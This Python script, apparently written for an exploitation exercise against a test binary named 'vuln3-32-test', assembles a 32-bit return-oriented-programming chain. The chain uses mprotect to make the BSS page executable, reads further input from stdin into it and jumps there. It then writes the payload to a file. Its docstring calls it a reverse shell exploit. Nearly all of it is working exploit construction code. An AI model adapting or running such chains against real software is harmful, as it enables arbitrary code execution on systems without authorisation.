from address_pop import doubadd
import junk_length_and_addresses
import address_pop
from struct import pack
import exploit_gadgets

binary_name = "vuln3-32-test"

rop = exploit_gadgets.ROPgadgets(binary_name)
# Macro definitions for ROP Gadgets
POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret
POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
ADDEAXEDX = pack('<I', rop.get_gadget("add eax, edx ; ret")) # add eax, edx ; ret
ADDECXECX = pack('<I', rop.get_gadget("add ecx, ecx ; ret"))
ADDEAXECX = pack('<I', rop.get_gadget("add eax, ecx ; ret"))

MOVISTACK = pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret")) # mov dword ptr [edx], eax ; ret
XOREAX    = pack('<I', rop.get_gadget("xor eax, eax ; ret")) # xor eax, eax ; ret
INCEAX    = pack('<I', rop.get_gadget("inc eax ; ret")) # inc eax ; ret
INCEBX    = pack('<I', rop.get_gadget("inc ebx ; ret")) # inc ebx ; ret

INCECX    = pack('<I', rop.get_gadget("inc ecx ; ret")) # inc ecx ; ret
INCEDX    = pack('<I', rop.get_gadget("inc edx ; ret")) # inc edx ; ret
DECEDX    = pack('<I', rop.get_gadget("dec edx ; ret")) # dec edx ; ret
INT80     = pack('<I', 0x0806f7c0) # int 0x80
NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret


def rop_exploit(base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
    # We need to align the BSS with the page size
    bss = (bss & 0xfffff000)
    print(f"{bss:x}")
    exploit = b'\x41' * padding

    
    exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
    exploit += XOREAX 
    exploit += ADDEAXECX # syscall mprotect
    exploit += address_pop.pop_reg(bss,POPEBX,0,INCEBX,"inc")

    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
    exploit += INCEDX * 8
    exploit += address_pop.doubadd(0x0000800,ADDECXECX,INCECX)
    exploit += ADDECXECX
    exploit += INT80 # int 0x80


    # BSS is now executable
    # # Read into BSS
    exploit += XOREAX
    exploit += INCEAX * 3 #Syscall Read
    exploit += address_pop.pop_reg(bss,POPECXEBX,0,INCECX,"inc") #bss
    exploit += INCECX # One of the incs is consumed by EBX
    exploit += address_pop.pop_reg(0xffffffff,POPEBX,0,INCEBX,"inc")
    exploit += INCEBX #stdin
    

    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
    # Read 28 bytes
    exploit += INCEDX * 29 
    exploit += INT80


    # We must jump to an offset of BSS as BSS contains null characters
    exploit += pack('<I', bss + 4) 
    exploit += b"A"*100

    return exploit


def test():
    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(0x080da060))
    outfile.close()


if __name__ == "__main__":
    test()